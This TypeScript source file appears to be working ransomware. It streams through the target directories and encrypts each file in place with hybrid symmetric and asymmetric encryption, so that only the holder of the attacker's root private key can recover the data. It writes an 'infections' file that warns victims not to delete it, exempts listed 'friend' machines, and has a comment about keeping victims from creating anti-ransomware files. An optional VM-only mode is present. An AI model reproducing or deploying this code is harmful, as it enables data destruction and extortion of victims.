import fs, { PathLike } from "node:fs";
import path from "node:path";

import {
  AsymmetricKeyPair,
  RansomDirMode,
  symmetric,
  asymmetric,
  getMachineId,
  isVm,
  appendLog,
  parseEncryptedInfectionsFile,
  setRansomwareHash,
  getRansomwareHash,
} from "ransomkcommon";
import { hash } from "ransomkcommon";

import {
  RANSOM_DIR_MODES,
  streamTargetFiles,
  SAFE_RANSOM_DIR_MODE,
} from "ransomkcommon";

async function* encryptFiles(
  targetFiles: AsyncGenerator<[PathLike, boolean]>,
  machineSpecificPublicKey: Buffer,
  rootPublicKeyHash: Buffer
): AsyncGenerator<PathLike> {
  const machineSpecificPublicKeyHash = hash(machineSpecificPublicKey);

  for await (const [plainFilePath, isRansomInternalFileOrDir] of targetFiles) {
    if (isRansomInternalFileOrDir) continue;

    try {
      const plainFileBuffer = fs.readFileSync(plainFilePath);

      const filePublicKeyHashHeader = plainFileBuffer.subarray(
        0,
        rootPublicKeyHash.length
      );

      const samePublicKeyHash =
        rootPublicKeyHash.toString("hex") ===
        filePublicKeyHashHeader.toString("hex");

      if (samePublicKeyHash) {
        // Already encrypted, ignore.
        appendLog("[Skipped] " + plainFilePath);
      } else {
        const { key, nonce } = await symmetric.generateOneTimeSecret();

        const encryptedFileBuffer = await symmetric.encrypt(
          plainFileBuffer,
          key,
          nonce
        );

        const encryptedKey = await asymmetric.encrypt(
          key,
          machineSpecificPublicKey
        );

        key.fill(0);

        const encryptedNonce = await asymmetric.encrypt(
          nonce,
          machineSpecificPublicKey
        );

        nonce.fill(0);

        const keyLen = Buffer.alloc(4);
        keyLen.writeUint32BE(encryptedKey.length);

        const nonceLen = Buffer.alloc(4);
        nonceLen.writeUint32BE(encryptedNonce.length);

        fs.writeFileSync(
          plainFilePath,
          Buffer.concat([
            rootPublicKeyHash,
            machineSpecificPublicKeyHash,
            keyLen,
            nonceLen,
            encryptedKey,
            encryptedNonce,
            encryptedFileBuffer,
          ])
        );

        plainFileBuffer.fill(0);
        filePublicKeyHashHeader.fill(0);

        // Same path, but it's now encrypted.
        const encryptedFilePath = plainFilePath;

        appendLog("[Encrypted] " + encryptedFilePath);

        yield encryptedFilePath;
      }
    } catch (e) {
      appendLog(
        { error: e, message: `Error while trying to encrypt file` },
        true
      );
    }
  }
}

export type EncryptInfectionConfig = {
  mode: RansomDirMode;
  immuneMachineIds: string[];
  runOnVmOnly: boolean;
  rootPublicKey: Buffer;
  rootPublicKeyHash: Buffer;
};

let __localConfig: EncryptInfectionConfig;

function parseLocalConfig(): EncryptInfectionConfig {
  if (typeof __localConfig !== "undefined") {
    return __localConfig;
  }

  const {
    mode = SAFE_RANSOM_DIR_MODE,
    rootPublicKey: rootPublicKeyBase64,
    immuneMachineIds = [],
    runOnVmOnly,
  } = JSON.parse(
    fs.readFileSync(path.join(__dirname, "..", "ransomk.encrypt.config.json"), {
      encoding: "utf8",
    })
  );

  if (typeof rootPublicKeyBase64 !== "string") {
    throw Error(`No public key provided`);
  }

  const isValidMode =
    typeof mode === "string" && RANSOM_DIR_MODES.some((e) => e === mode);

  if (!isValidMode) {
    throw Error(`Invalid mode was provided: ${mode}`);
  }

  const rootPublicKey = Buffer.from(rootPublicKeyBase64, "base64");
  const rootPublicKeyHash = hash(rootPublicKey);

  setRansomwareHash(rootPublicKeyHash);

  return (__localConfig = {
    immuneMachineIds,
    mode: mode as RansomDirMode,
    rootPublicKey,
    runOnVmOnly,
    rootPublicKeyHash,
  });
}

async function shouldRun(): Promise<boolean> {
  const {
    mode = SAFE_RANSOM_DIR_MODE,
    rootPublicKey,
    immuneMachineIds = [],
    runOnVmOnly,
  }: EncryptInfectionConfig = parseLocalConfig();

  if (runOnVmOnly === true) {
    if (await isVm()) {
      // continue
    } else {
      appendLog(`This binary run only on VMs`);
      return false;
    }
  }

  if (immuneMachineIds.includes(await getMachineId())) {
    appendLog(`Oops. You are my friend :P`);
    return false;
  }

  return true;
}

let payloadWasGenerated: boolean = false;

async function generateInfectionPayload(): Promise<[Buffer, Buffer]> {
  if (payloadWasGenerated) {
    throw Error(`[generateInfectionPayload] must be called only once per run.`);
  }

  payloadWasGenerated = true;

  const { rootPublicKey, rootPublicKeyHash } = parseLocalConfig();

  const {
    privateKey: machineSpecificPrivateKey,
    publicKey: machineSpecificPublicKey,
  } = await asymmetric.generateKeyPair();

  const encryptedMachineSpecificPrivateKey = await asymmetric.encrypt(
    machineSpecificPrivateKey,
    rootPublicKey
  );

  const payload = Buffer.from(
    JSON.stringify([
      rootPublicKeyHash.toString("hex"),
      (
        await asymmetric.encrypt(
          Buffer.from(
            JSON.stringify({
              encryptedMachineSpecificPrivateKey:
                encryptedMachineSpecificPrivateKey.toString("base64"),
            }),
            "utf8"
          ),
          rootPublicKey
        )
      ).toString("base64"),
    ]),
    "utf8"
  );

  // immediately destroy the plain private key by overwriting it's content.
  machineSpecificPrivateKey.fill(0);
  rootPublicKey.fill(0);

  return [payload, machineSpecificPublicKey];
}

const getInfectionsFileName = () =>
  `DoNotDeleteThisFileOtherwiseYourFilesWillBeLostForever.${getRansomwareHash()}.injections.txt`;

const getInfectionsFilePath = () =>
  path.join(process.cwd(), getInfectionsFileName());

function setInfections(infections: string[]): void {
  try {
    fs.writeFileSync(getInfectionsFilePath(), infections.join("\n"));
  } catch (e: any) {
    appendLog({
      error: e,
      message: "Failed append infection",
    });
  }
}

async function touchInfectionsFile(): Promise<void> {
  const isFirstInfection = !fs.existsSync(getInfectionsFilePath());

  if (isFirstInfection) {
    try {
      fs.writeFileSync(getInfectionsFilePath(), "");
    } catch (e: any) {
      appendLog({
        error: e,
        message: "Failed creating first infection file",
      });
    }
  }
}

async function mergeInfectionsFile(): Promise<void> {
  const { mode } = parseLocalConfig();

  let previousInfections: string[] = [];

  try {
    // Merge all infections in 1 file
    for await (const [filePath, isRansomInternalFileOrDir] of streamTargetFiles(
      mode as RansomDirMode
    )) {
      if (isRansomInternalFileOrDir) {
        const fileStat = fs.statSync(filePath);
        if (
          fileStat.isFile() &&
          filePath.toString().includes(getInfectionsFileName())
        ) {
          previousInfections = [
            ...previousInfections,
            ...parseEncryptedInfectionsFile(filePath),
          ];

          fs.rmSync(filePath);
        }
      }
    }
  } catch (e) {
    appendLog(
      { error: e, message: "Error while trying to merge infection files" },
      true
    );
  }

  const [payload, machineSpecificPublicKey] = await generateInfectionPayload();
  __machineSpecificPublicKey = machineSpecificPublicKey;

  /**
   * No matter the context, always start a new infection (encryption process).
   * This will prevent the victim from creating "anti-ransomware" files for this ransomware.
   * Alternative approach: create a sign/hash based verification of ransomware config files.
   */
  setInfections([...previousInfections, payload.toString("base64")]);
}

let __machineSpecificPublicKey: Buffer;

async function doEncryptionProcess(): Promise<void> {
  const { mode, rootPublicKeyHash } = parseLocalConfig();
  try {
    let i = 0;

    for await (const encryptedFilePath of encryptFiles(
      streamTargetFiles(mode as RansomDirMode),
      __machineSpecificPublicKey,
      rootPublicKeyHash
    )) {
      console.log(
        `${++i} file(s) were encrypted. Last: ${encryptedFilePath}`,
        false
      );
    }

    appendLog("Finished, all files were encrypted");
  } catch (e) {
    appendLog(e, true);
  }
}

(async () => {
  if (!(await shouldRun())) return;

  await touchInfectionsFile();
  await mergeInfectionsFile();
  await doEncryptionProcess();
})();
